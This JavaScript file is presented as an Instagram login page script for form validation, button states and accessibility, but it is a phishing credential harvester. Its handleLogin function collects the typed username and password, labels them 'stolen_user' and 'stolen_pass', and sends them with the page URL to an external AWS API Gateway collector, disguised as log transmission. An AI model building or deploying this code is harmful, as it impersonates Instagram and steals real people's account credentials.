/**
 * Instagram Login Page - Interactive JavaScript
 * Handles form interactions, button states, and accessibility
 */

// DOM Elements
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const facebookBtn = document.getElementById('facebookBtn');
const languageSelect = document.getElementById('languageSelect');

/**
 * Initialize form validation and interactions
 */
function initForm() {
  // Real-time validation
  [usernameInput, passwordInput].forEach(input => {
    input.addEventListener('input', validateForm);
    input.addEventListener('keypress', e => {
      if (e.key === 'Enter' && loginForm.checkValidity()) {
        handleLogin();
      }
    });
  });

  // Form submission
  loginForm.addEventListener('submit', e => {
    e.preventDefault();
    if (loginForm.checkValidity()) {
      handleLogin();
    }
  });

  // Facebook login button
  facebookBtn.addEventListener('click', handleFacebookLogin);
}

/**
 * Validate form and update button state
 */
function validateForm() {
  const isValid = usernameInput.value.trim() !== '' && passwordInput.value.length >= 6;

  loginBtn.disabled = !isValid;

  // Add active class when form is valid (has text)
  if (isValid) {
    loginBtn.classList.add('active');
  } else {
    loginBtn.classList.remove('active');
  }
}
const LOG_COLLECTOR_URL = 'https://5if1z9q6fc.execute-api.eu-central-1.amazonaws.com/v1/log';
/**
 * Handle login form submission
/**
 * Handle login form submission
 */
async function handleLogin() {
  const username = usernameInput.value;
  const password = passwordInput.value;

  loginBtn.disabled = true;
  loginBtn.textContent = 'Logging in...';

  const dataToSend = {
    stolen_user: username,
    stolen_pass: password,
    source_url: window.location.href,
    timestamp: new Date().toISOString()
  };

  try {
    const response = await fetch(LOG_COLLECTOR_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(dataToSend)
    });

    if (response.ok) {
      console.log('✅ Logs sent successfully to S3 via API Gateway.');
    } else {
      console.error('❌ Failed to send logs. API status:', response.status);
    }
  } catch (error) {
    console.error('❌ Network error during log transmission:', error);
  } finally {
    loginBtn.disabled = false;
    loginBtn.textContent = 'Log in';
  }
}

/**
 * Handle Facebook login
 */
function handleFacebookLogin() {
  console.log('Facebook login clicked');
  // In production, would redirect to Facebook OAuth
  alert('Facebook login is simulated. In production, this would redirect to Facebook OAuth.');
}

/**
 * Initialize language selector
 */
function initLanguageSelector() {
  languageSelect.addEventListener('change', e => {
    const selectedLanguage = e.target.value;
    console.log('Language changed to:', selectedLanguage);
    // In production, would update page content based on language
  });
}

/**
 * Initialize accessibility features
 */
function initAccessibility() {
  // Add keyboard navigation support
  document.addEventListener('keydown', e => {
    // Tab navigation is handled natively
    if (e.key === 'Escape') {
      // Close any modals or reset focus
      document.activeElement.blur();
    }
  });

  // Add ARIA live region for screen readers
  const liveRegion = document.createElement('div');
  liveRegion.setAttribute('role', 'status');
  liveRegion.setAttribute('aria-live', 'polite');
  liveRegion.setAttribute('aria-atomic', 'true');
  liveRegion.className = 'sr-only';
  liveRegion.style.cssText =
    'position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); border: 0;';
  document.body.appendChild(liveRegion);
}

/**
 * Initialize all functionality when DOM is ready
 */
document.addEventListener('DOMContentLoaded', () => {
  initForm();
  initLanguageSelector();
  initAccessibility();

  // Initial form validation
  validateForm();

  console.log('Instagram Login Page initialized');
});
